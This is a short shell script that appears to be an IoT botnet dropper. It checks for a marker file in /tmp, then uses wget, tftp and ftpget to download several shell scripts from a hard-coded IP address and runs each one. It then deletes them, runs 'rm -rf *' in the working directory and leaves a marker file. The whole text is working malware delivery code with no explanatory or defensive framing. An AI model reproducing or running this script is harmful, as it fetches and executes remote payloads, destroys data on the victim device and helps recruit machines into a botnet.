file="/tmp/3uiot6wchz"
if [ ! -f "$file" ]; then
   cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.133.5.119/bins.sh; chmod +x bins.sh; sh bins.sh; tftp 195.133.5.119 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 195.133.5.119; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 195.133.5.119 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; touch /tmp/3uiot6wchz
fi
